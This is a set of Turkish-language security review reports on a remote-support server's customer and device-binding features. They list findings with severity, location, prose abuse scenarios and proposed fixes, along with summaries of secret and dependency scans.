### [DÜŞÜK] B-P8c2-1 Yeni test dosyasında sahte TURN secret'i literal olarak yazılmış; CI gitleaks işi kırmızıya düşer — A05 (yapılandırma / süreç)

Yer: `apps/server/test/integration/bindings-p8c.test.ts:36` (`TURN_SECRET: "test-turn-secret-…"`).
Sorun: Değer, `test/helpers/secrets.ts:3`'teki `FAKE_TURN_SECRET` ile aynı ve gerçek bir secret değil. Ancak `.gitleaks.toml` allowlist'i yalnız `helpers/{app,secrets}.ts` yollarını kapsıyor (S-P3-5 "tek kaynak" kuralı). Dir taraması bu satırı `generic-api-key` olarak yakaladı. Dosya commit edildiğinde CI'daki `gitleaks git … --exit-code 1` adımı başarısız olur. Ayrıca "sahte secret tek kaynakta" kuralı deliniyor; ileride gerçek bir değerin aynı kalıpla test dosyasına girmesi gürültü içinde gözden kaçabilir.
İstismar senaryosu: Doğrudan bir istismar yok. Risk süreçle ilgili: CI kırılır, kırmızıyı geçmek için allowlist'in gevşetilmesi cazip hale gelir.
Düzeltme (backend-dev): `import { FAKE_TURN_SECRET } from "../helpers/secrets.ts"` eklenip `TURN_SECRET: FAKE_TURN_SECRET` kullanılmalı. Allowlist genişletilmemeli.

### [DÜŞÜK] B-P8c2-2 §15.4 yolunda kilit sırası ters (device_bindings → customers); pasife alma/yenileme ile kilitlenme mümkün, admin tarafında yeniden deneme yok — A04 (kullanılabilirlik)

Yer: `apps/server/src/bindings/service.ts:160,169` (önce `lockActiveOfSession` FOR UPDATE, ardından müşterisiz oturumda `target.customerId` için `shareStatus` FOR SHARE); karşı taraf `customers/service.ts:268,273` (pasife alma) ve `:245,252` (ref yenileme): `customers` FOR UPDATE → `revokeForOwner` (device_bindings UPDATE).
Sorun: Müşterisiz (Genel ref ya da kod) oturumda, müşteri bağlı bir kaydın yenilenmesi, aynı müşterinin pasife alınması veya ref'inin yenilenmesiyle aynı anda olursa döngü oluşur: issue `binding X → customer S` bekler, pasife alma `customer X → binding` bekler. InnoDB 1213 ile taraflardan birini geri alır. Bütünlük korunuyor: issue kurban olursa bir kez yeniden deneniyor; kayıt revoke edilmiş göründüğü için yeni Genel kayıt açılıyor, pasif müşteriye bağ kurulmuyor. Pasife alma veya yenileme kurban olursa hiçbir şey yazılmıyor, ancak admin 503 `NOT_READY` alıyor ve işlemi tekrarlaması gerekiyor. implementation.md'deki "kilitlenme yok" ifadesi yalnız kabul yolu için doğru.
İstismar senaryosu: Sızan dosya nedeniyle müşteriyi pasife almak isteyen admin, saldırganın aynı müşteri kaydıyla zamanlanmış `binding.request` göndermesi sonucunda nadiren 503 alır. Saldırganın elinde bunun için admit edilmiş bir oturum olmalı (teknisyen onayı gerekir) ve oturum başına yalnız 3 deneme hakkı var. Pratikte istismar edilemez; pasife almayı kalıcı olarak engelleyemez.
Düzeltme (backend-dev): Tercih edilen yol: `deactivateCustomer`/`rotateCustomerRef` TX'lerinde `isTransientDbError` için tek bir yeniden deneme yapılması (rotate için `withRefRetry` genişletilebilir). Alternatif: §15.4 yolunda aday kaydın `customer_id`'si kilitsiz okunup önce müşteri FOR SHARE ile kilitlenmeli, sonra kayıt kilitlenip `customer_id` yeniden doğrulanmalı. implementation.md'deki "kilitlenme yok" notu düzeltilmeli.

## Gözlem (bulgu değil)

- B-P8c-1 testindeki "pasif müşteriye yeni talep → 404" adımı, ret kararını TX dışındaki `resolveRef` peek'inde alıyor. TX içindeki `shareStatus` dalı (peek ile TX arasındaki pencere) doğrudan sınanmıyor. Kod doğru; ileride regresyon riskini azaltmak için, `resolveRef` ACTIVE dönerken TX öncesinde müşteriyi pasife çeken bir test (hook veya sahte saat) eklenebilir.

## Otomatik tarama çıktıları

- `pnpm audit --prod --audit-level high`: **No known vulnerabilities found** (çıkış 0).
- gitleaks v8.30.1 `dir /repo --redact --config .gitleaks.toml`: 14 eşleşme, hepsi `generic-api-key`.
  - 13 tanesi `apps/web/.next/**` altında (Next.js `previewModeSigningKey/EncryptionKey`, `encryptionKey`). Klasör `.gitignore:14` ile hariç tutulmuş, git'te izlenen dosya yok, yerel build gürültüsü. (Staging/prod imajı kendi build'inde yeni anahtar üretiyor.)
  - 1 tanesi `apps/server/test/integration/bindings-p8c.test.ts:36` → B-P8c2-1.
  - Taramanın `apps/ packages/ docs/ deploy/` ile sınırlı haline (`.next` hariç) düşen tek eşleşme B-P8c2-1.
- Gizli bilgi regex'i (değişen dosyalar): gerçek secret yok.

## Tasarımda vaat edilip kodda bulunmayanlar

- Yok. Tur 1'de eksik olan §15.7(1), §15.1 (2)(3), §15.3 servis/eşzamanlılık testleri ve AC-171 "bekleyenler anında düşer" garantisi artık kodda ve testte var.

## Olumlu

- Pasife alma iptali aynı TX'e alındı; süpürücü artık yalnız yedek görevi görüyor. Audit kullanıcı aktörlü ve sayı doğru.
- Anlık görüntü (REPEATABLE READ) tuzakları üç ayrı yerde (`lockActive*`, `renew`, `issueTx` müşteri durumu) bilinçli olarak giderildi. Gerçek hatayı yakalayan eşzamanlılık testi eklendi.
- Kayıt verme retlerinin tamamı metrikli. İstemciye tek tip mesaj gidiyor, ret nedeni yalnız sunucuda kalıyor.
- `revoke-binding` çift yetki istiyor ve paneldeki görünürlük koşulu da aynı.

Karar: Kritik/Yüksek 0 → **GEÇTİ**. B-P8c2-1, commit'ten önce düzeltilmeli; düzeltme tek satır, düzeltilmezse CI kırılır. B-P8c2-2 düzeltilmezse `docs/gereksinimler.md` §9'a "Sonra" olarak yazılmalı.

---

# Güvenlik Raporu — E10/P8c-1 — Kod turu 1 (2026-11-12)

DURUM: GEÇTİ (Kritik/Yüksek 0). Orta bulgular P8c-1 düzeltme turunda kapatılmalı; açık kalırsa gereksinimler §9 "Sonra".
Özet: Kritik 0 / Yüksek 0 / Orta 2 / Düşük 4

Kapsam: commit edilmemiş çalışma ağacı (sunucu + panel). İncelenenler: `apps/server/src/{bindings,customers}/*`, `signaling/{binding,handlers,active}.ts`, `requests/{service,panel,repo,routes,ws,hub,jobs}.ts`, `sessions/{routes,service,history,history-repo}.ts`, `audit/mask.ts`, `lib/{logger,ids,csv}.ts`, `auth/guards.ts`, migration `20261112120000_p8c_customers`, `prisma/sql/grants.sql`, `packages/contracts/src/{ws,api/requests,api/bindings}.ts`, panel `customers/`, `requests/request-card.tsx`, `request-notifier.tsx` ve P8c testleri. Tur sınırı nedeniyle panelin tamamı satır satır okunmadı; XSS kontrolü sink taramasıyla yapıldı.

## Tasarım şartlarının kodda doğrulanması

| Şart                            | Durum                 | Kanıt                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| ------------------------------- | --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| IDOR / tenant (T41, AC-172)     | Var                   | `customers/routes.ts`: her uçta `requireAuth` → `requirePerm` → `tenantScope`. Repo sorgularının hepsi `{id, tenantId}` ile çalışıyor (`customers/repo.ts:72,77,86`). Detay sekmeleri `assertExists` + çift yetki istiyor, oturum sekmesi `historyScope` kullanıyor (`service.ts:140-159`). `options` tenant kapsamlı ve ≤ 20 sonuç döndürüyor. `revoke-binding` talebi `{id, tenantId}` ile buluyor ve istemciden kayıt kimliği almıyor (`bindings/service.ts:197`). `POST /sessions customerId` için `customers.view` + aynı tenant + ACTIVE aranıyor, aksi 404 (`sessions/service.ts:93-94`, `routes.ts:51`). `?customer=` filtresi her zaman `tenantId` ile birlikte uygulanıyor (`requests/repo.ts:183`). Bileşik FK'ler migration'da var. |
| bindingKey üretimi ve saklama   | Var                   | `rsb_` + 32 bayt CSPRNG (`lib/ids.ts:34`). DB'de yalnız SHA-256 tutuluyor; geçersizleşmede `key_hash=NULL` ve CHECK var. Anahtar yalnız isteyen sokete gidiyor (`signaling/binding.ts:37`). `REDACT_PATHS` += `bindingKey`, `previousKey` ve PII alanları.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| Tek tip `BINDING_INVALID`       | Büyük ölçüde var      | Yok, unutulmuş ve geçersiz durumlarının hepsi aynı sorguya düşüyor (`key_hash` NULL). Aynı 404 dönüyor ve aynı `req.ref_invalid` kovası sayıyor (`bindings/service.ts:45-49`). Biçim dışı anahtarda ayrılık var (B-P8c-5). Geçerli anahtar ek bir sorgu yapıyor; 256 bitte istismar edilemez.                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| `/public/bindings/*` hız sınırı | Var                   | status 60/dk (geçerliler) + geçersizler ref kovasında; revoke 30/dk ve sınır doğrulamadan önce uygulanıyor; her durumda 204. `bodyLimit` 1 KB, AGENT kuralı, `no-store`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| K20 (kovalardan muaf değil)     | Kodda var, testte yok | `requests/service.ts:227-232`: ip/önek/net48 kovaları `trusted` dışında herkese uygulanıyor. `privileged` yalnız tenant tavanı seçiminde kullanılıyor (`:286`). Kayıt başına 6/sa ve 1 bekleyen sınırı TX içinde. **Test eksik**: B-P8c-2.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| WS binding.offer/request        | Var                   | Teklif yalnız `sendHelloGuest` (admit sonrası) içinde, AGENT ve ≥ 0.10.0 için gidiyor (`binding.ts:14-19`). İstek yalnız ADMITTED misafirden kabul ediliyor, aksi 1008 (`handlers.ts:115`). Ayrıca teklif alan peer ile aynı peer olması gerekiyor, oturum başına en çok 3 istek (`binding.ts:26-34`). Müşteri oturumdan alınıyor.                                                                                                                                                                                                                                                                                                                                                                                                              |
| G-E10-1 bayat kaynak            | Var                   | `bindings/service.ts:139-145` + `binding.denied` audit. `toItem` içinde `viaBinding`, `bindingRevoked` ve `staleSource` (`panel.ts:42-45`). Test (1) var. Test (2) ve (3) bulunamadı: B-P8c-2.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| G-E10-3 tek etkin kayıt         | Var                   | STORED `active_session_id` + UQ, §15.3 adım sırası (`service.ts:148-171`), UQ ihlalinde bir yeniden deneme. DB testi var; servis düzeyi test (aynı oturumda iki farklı `previousKey`, eşzamanlı iki istek) yok: B-P8c-2.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| G-E10-4 REPLACED audit          | Var                   | `service.ts:165-166`: kaybeden tenant'a yazılıyor, karşı tenant kimliği yok.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| G-E10-7 müşteri bağı            | Var                   | `service.ts:156-159`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| Pasife alma / ref yenileme      | Var                   | Kayıtlar aynı TX'te düşürülüyor (`customers/service.ts:252,273`, `panel.ts` Genel rotate). Bekleyen talepler commit sonrasında iptal ediliyor, ayrıca süpürücü var. Yeniden aktif etme yeni ref + `ref_rotated_at` yazıyor.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| K19 audit maskesi               | Var                   | `customerAuditView` izinli liste (`mask.ts`). `updated` yalnız değişen alanları ve `changed[]` içeriyor, `created`/`anonymized` PII taşımıyor. Dize araması testi var (`customers-p8c-api.test.ts:404`). Gövde loglanmıyor.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| CSV injection                   | Var                   | Yeni "Müşteri firma" sütunu ortak `csvCell` formül kaçışından geçiyor; test var (`:495`).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| Panel XSS (T45)                 | Sorun yok             | Yeni dosyalarda `dangerouslySetInnerHTML`/`innerHTML` yok. Ad ve not React metni olarak bağlanıyor, `href` yalnız ULID kimliklerden üretiliyor, toast düz metin.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| CSRF/Origin                     | Var                   | Tüm POST/PATCH uçları `requireAuth` hook'u üzerinden Origin + double-submit kontrolünden geçiyor (`guards.ts:44-48`). Public uçlarda `checkPublicClient("AGENT")` var.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| grants.sql                      | En az yetki           | customers/device_bindings: SELECT/INSERT/UPDATE. request_refs append-only (SELECT/INSERT). DELETE/DDL REVOKE ediliyor.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| Metrik etiketleri               | PII yok               | `via`, `renewed`, `reason` yalnız sabit kümeler; `rs_customers_active` etiketsiz.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |

## Bulgular (öncelik sırasıyla)

### [ORTA] B-P8c-1 Pasife alma ile eşzamanlı ref talebi PENDING kalıp kabul edilebiliyor — A04 (iş mantığı yarışı)

Yer: `apps/server/src/requests/service.ts:223,246-249` (müşteri durumu peek'te okunuyor, talep TX'inde müşteri satırı yeniden doğrulanmıyor), `customers/service.ts:279` (iptal commit sonrasında).
Sorun: Ref yolunda müşterinin ACTIVE olduğu yalnız TX dışındaki `resolveRef` ile kontrol ediliyor. Pasife alma TX'i bu peek ile INSERT arasında commit olursa, pasif müşteriye bağlı yeni bir PENDING talep oluşur. `findPendingOfCustomer` bu talebi göremezse talep 30 sn süpürücüye kalır. Bu arada teknisyen talebi kabul edebilir; kabul TX'i müşteri durumuna bakmıyor (`panel.ts` accept). Kayıt verilmez (`issueTx` müşteriyi ACTIVE ister), ancak "pasife alma bekleyenleri anında düşürür" sözü (AC-171) dar bir pencerede delinir ve pasif müşteriye oturum açılır.
İstismar senaryosu: Dosyası sızdığı için pasife alınan müşterinin dosyasıyla saldırgan, pasife alma anında talep gönderir (ya da talepleri sürekli tekrar eder). Talep kuyrukta birkaç saniye "Müşteri firma: X" etiketiyle görünür. Teknisyen bunu meşru sanıp kabul eder. Teknisyen kabulü ve müşteri onayı yine gerektiği için etki sınırlı.
Düzeltme (backend-dev): Talep TX'inde `lockSettings`'ten sonra müşteri ref'iyse `SELECT status FROM customers WHERE id=? AND tenant_id=? FOR SHARE` çalıştırılmalı; ACTIVE değilse `REQUEST_REF_INVALID` + ROLLBACK. Kabul TX'inde de talebin `customer_id`'si doluysa müşteri ACTIVE değilse `REQUEST_CLOSED` dönmeli (veya talep CUSTOMER_PASSIVE ile iptal edilmeli). Entegrasyon testi eklenmeli.

### [ORTA] B-P8c-2 Bağlayıcı r2 testlerinin bir kısmı yok (K20 kovaları, G-E10-1 (2)(3), G-E10-3 servis) — A04/A09 (doğrulanmamış kontrol)

Yer: `apps/server/test/integration/bindings-p8c.test.ts` (yalnız `binding.status 60/dk` K20 testi var, `:275`). G-E10-3 için yalnız DB UQ testi var (`customers-p8c-db.test.ts:170`).
Sorun: §15.7(1) "testle sabitlenir" diyor; kayıtla açılan talebin `req.create.ip`/`prefix`/`net48` kovalarına ve tenant tavanına takıldığını gösteren test yok. §15.1'in (2) "kayıtla açılan talep, kayıt iptalinden sonra kabul → CONFLICT + `binding.denied`" ve (3) "`viaBinding=false`, `bindingRevoked=true`" testleri ayrı olarak bulunamadı. §15.3'ün "aynı oturumda iki farklı `previousKey` + anahtarsız istek → tek etkin satır" ve "eşzamanlı iki `binding.request`" testleri de yok. Kod bugün doğru, ancak gelecekte biri `privileged`'ı kova muafiyetine bağlarsa ya da `cur` önceliğini bozarsa bunu yakalayacak test yok.
Düzeltme (backend-dev): Dört entegrasyon testi eklenmeli: (a) aynı IP'den kayıtla 4. talep → `req.create.ip` 429 (trusted değil); (b) G-E10-1 (2) ve (3); (c) G-E10-3 sıralı ve `Promise.all` ile eşzamanlı istek → `SELECT COUNT(*) … WHERE active_session_id=sid` = 1.

### [DÜŞÜK] B-P8c-3 `revoke-binding` yalnız `customers.edit` istiyor; talebi görme yetkisi aranmıyor — A01

Yer: `apps/server/src/requests/routes.ts:65`.
Sorun: Tasarıma uygun (§15.2), ama `support_requests.view` olmadan talep kimliğiyle işlem yapılabiliyor. Tenant içinde kaldığı ve ULID tahmin edilemediği için etki düşük.
Düzeltme (mimar → backend-dev, isteğe bağlı): `requirePerm("support_requests.view")` eklenmeli ya da kabul edilen risk olarak §15.2'ye not düşülmeli.

### [DÜŞÜK] B-P8c-4 `binding.denied` audit'i kod dışı her ret nedeninde yazılmıyor; ret nedeni görünmüyor — A09

Yer: `bindings/service.ts:114-118`.
Sorun: Yalnız bayat kaynak audit'e yazılıyor. Oturum ACTIVE değil, tenant ya da müşteri pasif gibi retler sessiz kalıyor ve metrik yok. 3 istek sınırı aşımı da (`binding.ts:31`) metriksiz.
Düzeltme (backend-dev): `rs_binding_denied_total{reason: stale|inactive|rate}` sayacı eklenmeli (sabit etiketler).

### [DÜŞÜK] B-P8c-5 Biçim dışı `bindingKey` 400 VALIDATION alıyor, `BINDING_INVALID` ve `req.ref_invalid` kovasına düşmüyor — A07

Yer: `bindings/service.ts:55` (`parseInput` → 400), `requests/service.ts:233` (`parse(body)` biçim dışı anahtarda 400).
Sorun: §5.2'ye göre "biçim dışı" da aynı 404 olmalı. Biçim kamuya açık olduğu için ayrım bir oracle oluşturmuyor. Ancak biçim dışı denemeler geçersiz kovasını doldurmuyor (yalnız E9 ip kovası `create`'te sayılıyor; `status`'te hiçbir kova yok, çünkü `binding.status` kovası yalnız geçerli anahtarda sayılıyor). Sonuç: `/public/bindings/status`'a sınırsız 400 isteği atılabiliyor (Fastify bodyLimit 1 KB, DB'ye dokunmuyor).
Düzeltme (backend-dev): `bindingStatus` içinde `bindingKey` biçimi `safeParse` ile ayrı kontrol edilmeli; biçim dışıysa `bindingInvalid(svc, ip)` dönmeli (`resolveUsable` zaten null veriyor). `clientVersion` hatası 400 kalabilir.

### [DÜŞÜK] B-P8c-6 Pasife alma audit'indeki `cancelledRequests`, gerçekte iptal edilen sayı değil TX içindeki bekleyen sayısı — A09

Yer: `customers/service.ts:274-275`.
Sorun: İptal commit sonrasında ayrı yapılıyor. Sayı yarışta farklı olabilir (B-P8c-1 ile ilişkili). Audit'in doğruluğu ile ilgili küçük bir sorun.
Düzeltme (backend-dev): Alan `pendingAtDeactivate` olarak adlandırılmalı ya da B-P8c-1 düzeltmesiyle iptal TX içine alınmalı.

## Otomatik tarama çıktıları

- Gizli bilgi regex'i (`git diff` + yeni izlenmeyen P8c dosyaları: `bindings/`, `customers/`, `signaling/binding.ts`, `contracts/api/{bindings,customers}.ts`, panel `customers/`): **0 eşleşme**.
- `pnpm audit`, gitleaks dir taraması ve test koşusu bu turda **çalıştırılmadı** (tur sınırı). Yeni bağımlılık eklenmedi (`package.json` değişikliği yalnız contracts export'u). Düzeltme turunda koşulmalı.

## Tasarımda vaat edilip kodda bulunmayanlar

- §15.7(1) K20 kova testi, §15.1 test (2)/(3), §15.3 servis/eşzamanlılık testleri → B-P8c-2.
- AC-171 "bekleyenler anında düşer" yarış penceresinde garanti değil → B-P8c-1.
- Geri kalan G-E10-1..4, G-E10-7, K19 ve K20 şartları kodda var.

## Olumlu

- Kayıt verme yolu dar: teklif ile isteğin aynı soketten gelmesi, ADMITTED kapısı ve müşterinin oturumdan alınması. İstemci müşteri seçemiyor.
- Revoke edilen anahtarın özetinin NULL'lanması ve CHECK ile `revoked ⇔ hash NULL ⇔ neden` değişmezi.
- Ref ad alanı append-only; grant düzeyinde UPDATE/DELETE yok. Genel ve müşteri ref çözümlemesi paralel yapılıyor.
- K19 izinli liste tek fonksiyonda; dize araması testi var.
- `revoke-binding` istemciden kayıt kimliği almıyor; IDOR yüzeyi yok.

Karar: Kritik/Yüksek 0 → **GEÇTİ**. B-P8c-1/2 (Orta) P8c-1 düzeltme turunda kapatılmalı. B-P8c-3..6 (Düşük) kapatılmazsa `docs/gereksinimler.md` §9'a "Sonra" olarak yazılmalı.

---

# Güvenlik Raporu — E10/P8c — Tasarım turu (2026-11-12)

DURUM: GEÇTİ (tasarım). Orta bulgular mimari-e10 r2'ye işlenmeden dba P8c-1'e başlamamalı.
Özet: Kritik 0 / Yüksek 0 / Orta 3 / Düşük 6

Kapsam: `docs/mimari-e10.md` (§3.3–3.4, §5, §8.3–8.4, §14), `docs/adr/0017-bilgisayar-kaydi.md`, `docs/mimari-api.md` "Müşteriler ve bilgisayar kaydı (P8c)", `docs/mimari-protokol.md` §6. Karşılaştırma için `docs/mimari-e9.md` §13 (G-E9-1, bilinen kaynak eşikleri), `apps/server/src/audit/mask.ts` ve önceki S8b2-1 kararı da okundu. P8c'nin kodu henüz yok. Bu nedenle bulgular tasarım düzeyinde; her biri için mimariye işlenecek değişiklik yazıldı.

## Kararlar

### K19 — Müşteri yetkili kişi PII'si audit'te: **ONAY (maskeli), şartlı**

Audit 730 gün tutuluyor. PII açık yazılırsa §3.7'deki anonimleştirme audit üzerinden boşa çıkar (KVKK saklama sınırlaması). Bu yüzden maskeli tutulmalı. Maskeli "eski→yeni" biçimi AC-173'ü karşılar. Şartlar (backend-dev, P8c-1):

1. Maske tek fonksiyonda olmalı: `audit/mask.ts` → `customerAuditView(c)`. Bu bir **izinli liste**. Açık kalanlar: `name`, `fileLabel`, `status`, `refPrefix`. `phone` → mevcut `maskPhone` (ilk 3 + son 4). `email` → `<ilk harf>***@<alan adı>`. `contactName` ve `note` → `"<dolu>"` veya `null`. Bilinmeyen alan audit'e **girmez**. Mevcut `maskValue` kara listesi bu alanları yakalamıyor (`phone`, `email`, `contactName`, `note` regex'te yok). Maskeyi çağıran tarafa bırakmak yeni alan eklendiğinde sızıntıya yol açar.
2. `customer.updated` yalnız değişen alanları içerir. Maskeli değer aynı kalsa bile (ör. son 4 hanesi aynı telefon) alan `changed:[…]` listesinde görünür.
3. `customer.anonymized` hiçbir eski değer taşımaz. `customer.created` PII taşımaz (§5.7'de olduğu gibi).
4. Test: fixture müşterinin ham ad/telefon/e-posta/not değerleri, oluşturma/güncelleme/pasif/anonimleştirme sonrası hiçbir `audit_logs.old_value/new_value` JSON'unda geçmemeli (dize araması).
5. Pino: `/customers` POST/PATCH gövdeleri loglanmamalı. Gövde loglanan bir yol varsa `REDACT_PATHS` += `*.contactName`, `*.phone`, `*.email`, `*.note` (yalnız bu uçların bağlamında).

### K20 — Kayıtla gelen talep "bilinen kaynak": **ONAY, şartlı**

Bilinen kaynak sayılması kuyruk eşiği (≥ 40) ve tenant bilinen tavanı (120/sa) için kabul edilebilir. Kayıt yalnız teknisyenin kabul ettiği ve admit edilmiş bir oturumdan doğuyor. Sızıntının etkisi kayıt başına 1 bekleyen talep ve saatte 6 talep ile sınırlı. Ancak kayıt bir **kimlik doğrulaması değildir**: Genel dosyayla bir kez kabul edilmiş herhangi biri (sosyal mühendislik) kalıcı bir "kayıtlı bilgisayar" elde eder. Bu yüzden şartlar şunlar:

1. `viaBinding` ip/önek/net48 kovalarından ve E9'un tenant kovasından muaf **değildir** (mimari zaten böyle; testle sabitlenmeli).
2. Panel rozeti uyarıyı kaldırabilir, ancak **kalıcı ipucu** ("Müşteriyi firmanın kayıtlı numarasından arayın ve talep kodunu sorun") ve talep kodu kartta kalmalı. Rozet metni kaydın kapsamını göstermeli: "Kayıtlı bilgisayar — <müşteri firma>" ya da "Kayıtlı bilgisayar — Genel". Yeşil `ShieldCheck` "doğrulandı" anlamı taşımamalı; bilinen kaynak rozetleriyle aynı nötr stil kullanılmalı.
3. Rozet, kayıt **hâlâ etkinse** gösterilir (bkz. G-E10-1). Talep sonradan geçersizleşmiş bir kayıttan geliyorsa rozet yerine "Kaydı iptal edilmiş bilgisayar" (uyarı) gösterilir.

## Bulgular (öncelik sırasıyla)

### [ORTA] G-E10-1 Bağlantı yenileme, pasife alma ve kayıt iptali uçuştaki talepleri kapsamıyor; sızan dosyadan açılmış bekleyen talep kabul edilince yeni kayıt üretiliyor — A01/A04

Yer: mimari-e10 §3.4 "Verme" (2), mimari-api `rotate-ref` ("bekleyen talepler etkilenmez"), §9 talep kartı `viaBinding`.
Sorun: Verme koşulu yalnız "müşteri ACTIVE" şartına bakıyor. `rotate-ref` sonrasında müşteri hâlâ ACTIVE. Eski ref'ten ya da sonradan iptal edilen bir kayıttan açılmış bekleyen talep kabul edilirse oturum `binding.issued` alır. Saldırgan bu yolla, yenilemenin kapatmak istediği erişimi **taze bir kayıtla** geri kazanır. Ayrıca `viaBinding` yalnız `binding_id IS NOT NULL` koşulundan türetiliyor, bu yüzden iptal edilmiş kayıttan gelen talep "Kayıtlı bilgisayar" rozetiyle görünür.
İstismar senaryosu: Müşteri dosyası sızar. Saldırgan talep açar. Admin "Bağlantıyı yenile" der ve iş bitti sanır. Teknisyen kartta "Müşteri firma: X" görür ve talebi kabul eder. Saldırgan "Ekranımı paylaş" der ve 0.10.0 istemciyle X'e bağlı yeni bir kayıt alır. Bundan sonra her talebi "Kayıtlı bilgisayar" olarak düşer.
Düzeltme (mimar → backend-dev): §3.4 Verme (2)'ye talepten doğan oturum için ek koşul eklenmeli: `support_requests.created_at >= COALESCE(customers.ref_rotated_at, 0)` (Genel ise `tenant_request_settings.ref_rotated_at`). `support_requests.binding_id` doluysa o kaydın `revoked_at IS NULL` olması da gerekir. Koşul tutmazsa `error{CONFLICT}` döner ve kayıt verilmez; audit `binding.denied{reason:"stale_source"}`. Teknisyenin kod yolunda seçtiği müşteri bu kontrolden muaftır. `viaBinding` türetimi `binding_id IS NOT NULL AND b.revoked_at IS NULL` olmalı. `SupportRequestItem` += `bindingRevoked: boolean` (K20 şart 3). Entegrasyon testi: yenileme öncesi açılan talep kabul edildiğinde `binding.issued` gelmez.

### [ORTA] G-E10-2 Tek bir kaydı panelden iptal etme yolu yok; kötüye kullanılan kayda verilebilecek tek yanıt bütün müşteriyi ya da bütün Genel'i yenilemek — A04 (olay müdahalesi)

Yer: mimari-e10 §3.4 (geçersizleşme nedenleri), §10 runbook "kayıt anahtarı sızdı → müşteri bağlantısını yenile".
Sorun: V22 tek bilgisayarın tek başına geçersizleşmesini istiyor. Tasarımda bunu yalnız cihazın kendisi yapabiliyor ("Bu bilgisayarı unut"). Spam yapan ya da şüpheli bir kayıtta Admin'in elindeki tek araç müşterinin tüm dosyalarını ve kayıtlarını, Genel kayıtta ise tenant'ın **tüm** Genel dosyalarını ve kayıtlarını öldürmek. Bu orantısız bir müdahale. Pratikte ya hiç uygulanmaz ya da meşru müşterileri keser.
İstismar senaryosu: Genel kaydı ele geçiren saldırgan saatte 6 talep açar ve her biri "Kayıtlı bilgisayar" rozetiyle görünür. Admin'in tek seçeneği Genel bağlantıyı yenilemek. Bu durumda bütün müşterilere yeni dosya dağıtmak gerekir.
Düzeltme (mimar → backend-dev + frontend-dev, P8c-1): `POST /support-requests/:id/revoke-binding` eklenmeli (`customers.edit`, CSRF, tenantScope, talep `binding_id`'si üzerinden). İstemciden kayıt id'si alınmaz; böylece IDOR yüzeyi oluşmaz. `revoke_reason` += `ADMIN_REVOKED` (ikili CHECK). Bu kayda bağlı bekleyen talep varsa `CANCELLED` olur. Audit `binding.revoked{reason:"ADMIN_REVOKED", requestId}`. Talep kartı (ve geçmiş sekmesi) menüsüne "Bu bilgisayarın kaydını iptal et" eklenmeli; onay diyaloğunda varsayılan odak Vazgeç olmalı. Runbook'taki "sızdı" adımı bu uca göre güncellenmeli.

### [ORTA] G-E10-3 Oturum başına etkin kayıt tekilliği garanti edilmiyor; "yanıtı kaybolan istek" adımı birden fazla satır bulabilir — A04 (bütünlük)

Yer: mimari-e10 §3.4 Verme (3)–(4), §3.3 indeksler.
Sorun: (3)'te `previousKey` ile yerinde güncellenen satıra `last_session_id = sid` yazılıyor. Aynı oturumda ikinci bir `binding.request` (≤ 3 serbest) farklı bir `previousKey` getirirse (sızmış başka bir anahtar) ya da `previousKey` olmadan gelirse, (4)'teki `WHERE last_session_id=:sid AND revoked_at IS NULL` **birden çok** satır döndürebilir. Davranış tanımsız kalır: hangisi güncellenecek, öteki etkin mi kalacak? Tek oturum birden fazla etkin kayda "sahip" olabilir. Kayıt başına 6/sa ve 1 bekleyen sınırı da bu yolla çoğaltılabilir.
Düzeltme (dba + backend-dev): Değişmez kural "oturum başına en çok bir etkin kayıt" olmalı. DB'de üretilmiş sütun eklenebilir: `active_session_id CHAR(26) AS (IF(revoked_at IS NULL, last_session_id, NULL)) STORED` + `UQ(active_session_id)`. Servis (3)'te `previousKey` satırını güncellemeden önce aynı oturumun diğer etkin satırını `REPLACED` yapmalı. Oturumda zaten verilmiş bir kayıt varsa ikinci `previousKey` farklıysa yok sayılmalı (4'e düşülür). Entegrasyon testi: aynı oturumda iki farklı `previousKey` → tek etkin satır.

### [DÜŞÜK] G-E10-4 Başka tenant'ın kaydını `REPLACED` yapan olay, kaydı kaybeden tenant'ın audit'inde görünmüyor — A09

Yer: mimari-e10 §5.7 (`binding.issued{replacedOtherTenant}` yalnız veren tenant'ta).
Düzeltme (backend-dev): Aynı TX'te kaybeden tenant'a `binding.revoked{reason:"REPLACED"}` satırı yazılmalı (`tenant_id` = eski kaydın tenant'ı, actor `customer`). Karşı tenant'ın kimliği iki tarafta da yazılmamalı (tenant'lar arası bilgi sızıntısı olmasın).

### [DÜŞÜK] G-E10-5 `deviceKey`'in "her talepte gönderilir" kuralı S8b2-1 düzeltmesiyle çelişiyor — KVKK / A04

Yer: mimari-e10 §8.3 ("deviceKey dosya ilk yazıldığında üretilir, dosya durdukça kalır ve her talepte gönderilir").
Sorun: S8b2-1'de kişi değişip kutu işaretlenmediğinde `deviceKey` gönderilmiyor; kişi değişince yeni anahtar üretiliyor (`rememberPlan`). v2 metni bu kuralı ezerse paylaşılan profilde B'nin talebi A'nın cihaz izine bağlanır.
